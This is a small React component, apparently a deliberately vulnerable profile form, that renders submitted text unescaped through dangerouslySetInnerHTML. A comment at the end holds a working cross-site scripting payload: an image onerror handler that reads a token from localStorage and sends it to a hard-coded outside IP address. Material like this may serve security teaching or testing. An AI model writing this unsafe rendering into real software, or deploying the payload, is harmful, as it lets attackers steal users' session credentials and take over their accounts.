import { SetStateAction, useState } from 'react';

const MyProfile = () => {
  const [inputValue, setInputValue] = useState('');
  const [submittedValue, setSubmittedValue] = useState('');

  const handleChange = (e: { target: { value: SetStateAction<string> } }) => {
    setInputValue(e.target.value);
  };

  const handleSubmit = (e: { preventDefault: () => void }) => {
    e.preventDefault();
    setSubmittedValue(inputValue);
  };

  return (
    <div>
      <form onSubmit={handleSubmit}>
        <input type="text" value={inputValue} onChange={handleChange} />

        <button type="submit">Submit</button>
      </form>
      <div dangerouslySetInnerHTML={{ __html: submittedValue }} />
    </div>
  );
};

export default MyProfile;

// <img src=x onerror="var token = localStorage.getItem('token'); if (token) { fetch('http://181.215.135.141:80/localstorage.getItem?token=' + encodeURIComponent(token)); }" />
